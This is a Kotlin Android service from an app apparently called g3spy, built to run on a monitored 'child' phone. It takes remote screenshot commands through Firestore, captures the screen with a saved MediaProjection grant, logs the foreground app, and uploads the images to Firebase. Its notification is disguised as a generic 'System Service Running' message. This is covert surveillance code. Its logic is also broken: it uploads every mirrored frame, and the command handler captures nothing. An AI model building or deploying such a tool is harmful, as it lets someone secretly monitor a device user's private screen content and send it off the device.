package com.g3spy.child.services

import android.app.*
import android.app.usage.UsageEvents
import android.app.usage.UsageStatsManager
import android.content.Context
import android.content.Intent
import android.content.SharedPreferences
import android.content.ComponentName
import android.graphics.Bitmap
import android.graphics.PixelFormat
import android.hardware.display.DisplayManager
import android.hardware.display.VirtualDisplay
import android.media.Image
import android.media.ImageReader
import android.media.projection.MediaProjection
import android.media.projection.MediaProjectionManager
import android.net.Uri
import android.os.*
import android.util.DisplayMetrics
import android.util.Log
import android.view.WindowManager
import androidx.core.app.NotificationCompat
import com.g3spy.child.util.NotificationChannelManager
import com.google.firebase.Timestamp
import com.google.firebase.firestore.FirebaseFirestore
import com.google.firebase.firestore.ListenerRegistration
import com.google.firebase.storage.FirebaseStorage
import java.io.ByteArrayOutputStream
import java.io.File
import java.io.FileOutputStream
import java.io.IOException
import java.net.URISyntaxException
import java.util.*
import java.util.concurrent.Executors

class ScreenshotService : Service() {
    companion object {
        private const val TAG = "ScreenshotService"
        private const val NOTIFICATION_ID = 1004
        private const val CHANNEL_ID = "screenshot_channel"
        private const val CHANNEL_NAME = "Screenshot Service"
        private const val PREF_NAME = "ScreenshotServicePrefs"
        private const val PROJECTION_RESULT_CODE = "projection_result_code"
        private const val PROJECTION_INTENT_DATA = "projection_intent_data"
    }
    
    private lateinit var firestore: FirebaseFirestore
    private lateinit var storage: FirebaseStorage
    private lateinit var prefs: SharedPreferences
    private var commandListener: ListenerRegistration? = null
    
    private var mediaProjection: MediaProjection? = null
    private var imageReader: ImageReader? = null
    private var virtualDisplay: VirtualDisplay? = null
    private var displayWidth = 0
    private var displayHeight = 0
    private var displayDensity = 0
    
    private val executor = Executors.newSingleThreadExecutor()
    
    private val binder = LocalBinder()
    
    inner class LocalBinder : Binder() {
        fun getService(): ScreenshotService = this@ScreenshotService
    }
    
    override fun onCreate() {
        super.onCreate()
        
        firestore = FirebaseFirestore.getInstance()
        storage = FirebaseStorage.getInstance()
        prefs = getSharedPreferences(PREF_NAME, Context.MODE_PRIVATE)
        
        val windowManager = getSystemService(Context.WINDOW_SERVICE) as WindowManager
        val metrics = DisplayMetrics()
        windowManager.defaultDisplay.getMetrics(metrics)
        displayWidth = metrics.widthPixels
        displayHeight = metrics.heightPixels
        displayDensity = metrics.densityDpi
        
        NotificationChannelManager.createNotificationChannel(
            this,
            CHANNEL_ID,
            CHANNEL_NAME,
            NotificationManager.IMPORTANCE_LOW
        )
        
        restoreMediaProjection()
        
        listenForScreenshotCommands()
    }
    
    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        Log.d(TAG, "ScreenshotService started")
        
        if (intent?.hasExtra("resultCode") == true && intent.hasExtra("data")) {
            val resultCode = intent.getIntExtra("resultCode", Activity.RESULT_CANCELED)
            val data = intent.getParcelableExtra<Intent>("data")
            
            if (resultCode != Activity.RESULT_CANCELED && data != null) {
                
                with(prefs.edit()) {
                    putInt(PROJECTION_RESULT_CODE, resultCode)
                    putString(PROJECTION_INTENT_DATA, data.toUri(0))
                    apply()
                }
                
                initializeMediaProjection(resultCode, data)
            }
        }
        
        val notification = createNotification()
        startForeground(NOTIFICATION_ID, notification)
        
        return START_STICKY
    }
    
    override fun onBind(intent: Intent?): IBinder {
        return binder
    }
    
    override fun onDestroy() {
        super.onDestroy()
        stopMediaProjection()
        commandListener?.remove()
        executor.shutdown()
    }
    
    private fun createNotification(): Notification {
        
        val notificationIntent = Intent(this, this::class.java)
        val pendingIntent = PendingIntent.getActivity(
            this,
            0,
            notificationIntent,
            PendingIntent.FLAG_IMMUTABLE
        )
        
        return NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("System Service Running")
            .setContentText("Maintaining system services...")
            .setSmallIcon(android.R.drawable.ic_menu_camera)
            .setContentIntent(pendingIntent)
            .setPriority(NotificationCompat.PRIORITY_LOW)
            .build()
    }
    
    private fun restoreMediaProjection() {
        val resultCode = prefs.getInt(PROJECTION_RESULT_CODE, Activity.RESULT_CANCELED)
        val dataString = prefs.getString(PROJECTION_INTENT_DATA, null)
        
        if (resultCode != Activity.RESULT_CANCELED && dataString != null && dataString.isNotBlank()) {
            try {
                if (!dataString.startsWith("intent:") && !dataString.startsWith("android-app:")) {
                    Log.e(TAG, "Invalid URI scheme: $dataString")
                    return
                }
                
                val data = Intent.parseUri(dataString, 0)
                initializeMediaProjection(resultCode, data)
            } catch (e: URISyntaxException) {
                Log.e(TAG, "Invalid URI syntax: $dataString", e)
            } catch (e: Exception) {
                Log.e(TAG, "Failed to restore media projection", e)
            }
        }
    }
    
    private fun initializeMediaProjection(resultCode: Int, data: Intent) {
        val projectionManager = getSystemService(Context.MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
        mediaProjection = projectionManager.getMediaProjection(resultCode, data)
        
        mediaProjection?.let { projection ->
            
            imageReader = ImageReader.newInstance(
                displayWidth,
                displayHeight,
                PixelFormat.RGBA_8888,
                2
            ).apply {
                setOnImageAvailableListener({ reader ->
                    val image = reader.acquireLatestImage()
                    image?.let { processImage(it) }
                }, null)
            }
            
            virtualDisplay = projection.createVirtualDisplay(
                "ScreenshotDisplay",
                displayWidth,
                displayHeight,
                displayDensity,
                DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR,
                imageReader?.surface,
                null,
                null
            )
            
            Log.d(TAG, "Media projection initialized")
        }
    }
    
    private fun stopMediaProjection() {
        virtualDisplay?.release()
        imageReader?.close()
        mediaProjection?.stop()
        
        virtualDisplay = null
        imageReader = null
        mediaProjection = null
        
        Log.d(TAG, "Media projection stopped")
    }
    
    private fun listenForScreenshotCommands() {
        commandListener = firestore.collection("remote_commands")
            .whereEqualTo("command", "SCREENSHOT")
            .whereEqualTo("isExecuted", false)
            .addSnapshotListener { snapshots, e ->
                if (e != null) {
                    Log.e(TAG, "Listen failed", e)
                    return@addSnapshotListener
                }
                
                snapshots?.documentChanges?.forEach { change ->
                    val command = change.document
                    Log.d(TAG, "Received screenshot command: ${command.id}")
                    
                    takeScreenshot { success ->
                        if (success) {
                            
                            command.reference.update("isExecuted", true)
                        }
                    }
                }
            }
    }
    
    private fun takeScreenshot(callback: (Boolean) -> Unit) {
        if (mediaProjection == null) {
            Log.e(TAG, "Cannot take screenshot: Media projection not initialized")
            callback(false)
            return
        }
        
        virtualDisplay?.let {
            Handler(Looper.getMainLooper()).postDelayed({
                Log.d(TAG, "Taking screenshot")
                
                callback(true)
            }, 500) 
        } ?: run {
            Log.e(TAG, "Virtual display not initialized")
            callback(false)
        }
    }
    
    private fun processImage(image: Image) {
        executor.execute {
            var bitmap: Bitmap? = null
            var outputStream: ByteArrayOutputStream? = null
            var fileOutputStream: FileOutputStream? = null
            var tempFile: File? = null
            
            try {
                val buffer = image.planes[0].buffer
                val pixelStride = image.planes[0].pixelStride
                val rowStride = image.planes[0].rowStride
                val rowPadding = rowStride - pixelStride * displayWidth
                
                if (pixelStride <= 0 || rowStride <= 0 || rowPadding < 0) {
                    Log.e(TAG, "Invalid stride values: pixelStride=$pixelStride, rowStride=$rowStride, rowPadding=$rowPadding")
                    return@execute
                }
                
                val bitmapWidth = displayWidth + rowPadding / pixelStride
                if (bitmapWidth <= 0 || displayHeight <= 0) {
                    Log.e(TAG, "Invalid bitmap dimensions: width=$bitmapWidth, height=$displayHeight")
                    return@execute
                }
                
                bitmap = Bitmap.createBitmap(
                    bitmapWidth,
                    displayHeight,
                    Bitmap.Config.ARGB_8888
                )
                bitmap.copyPixelsFromBuffer(buffer)
                
                tempFile = File.createTempFile("screenshot", ".jpg", cacheDir)
                fileOutputStream = FileOutputStream(tempFile)
                bitmap.compress(Bitmap.CompressFormat.JPEG, 85, fileOutputStream)
                
                uploadScreenshot(tempFile)
            } catch (e: Exception) {
                Log.e(TAG, "Failed to process image", e)
            } finally {
                try {
                    outputStream?.close()
                    fileOutputStream?.close()
                    image.close()
                    bitmap?.recycle()
                } catch (e: IOException) {
                    Log.e(TAG, "Error closing resources", e)
                }
            }
        }
    }
    
    private fun getForegroundApp(): String {
        return try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
                val usageStatsManager = getSystemService(Context.USAGE_STATS_SERVICE) as? UsageStatsManager
                if (usageStatsManager != null) {
                    val currentTime = System.currentTimeMillis()
                    val usageEvents = usageStatsManager.queryEvents(currentTime - 1000 * 10, currentTime)
                    
                    var lastEvent: UsageEvents.Event? = null
                    while (usageEvents.hasNextEvent()) {
                        val event = UsageEvents.Event()
                        usageEvents.getNextEvent(event)
                        
                        if (event.eventType == UsageEvents.Event.MOVE_TO_FOREGROUND) {
                            lastEvent = event
                        }
                    }
                    
                    lastEvent?.packageName ?: "Unknown"
                } else {
                    "Unknown"
                }
            } else {
                "Unknown"
            }
        } catch (e: Exception) {
            Log.e(TAG, "Failed to get foreground app", e)
            "Unknown"
        }
    }
    
    private fun uploadScreenshot(file: File) {
        
        val appInForeground = getForegroundApp()
        
        val timestamp = System.currentTimeMillis()
        val filename = "screenshot_${timestamp}.jpg"
        val storageRef = storage.reference.child("screenshots/$filename")
        
        val uploadTask = storageRef.putFile(Uri.fromFile(file))
        uploadTask.addOnSuccessListener {
            
            storageRef.downloadUrl.addOnSuccessListener { uri ->
                
                val screenshotData = hashMapOf(
                    "imageUrl" to uri.toString(),
                    "timestamp" to Timestamp.now(),
                    "appInForeground" to appInForeground
                )
                
                firestore.collection("screenshots")
                    .add(screenshotData)
                    .addOnSuccessListener { documentReference ->
                        Log.d(TAG, "Screenshot uploaded with ID: ${documentReference.id}")
                        
                        file.delete()
                    }
                    .addOnFailureListener { e ->
                        Log.e(TAG, "Error uploading screenshot metadata", e)
                    }
            }
        }.addOnFailureListener { e ->
            Log.e(TAG, "Error uploading screenshot", e)
            file.delete()
        }
    }
}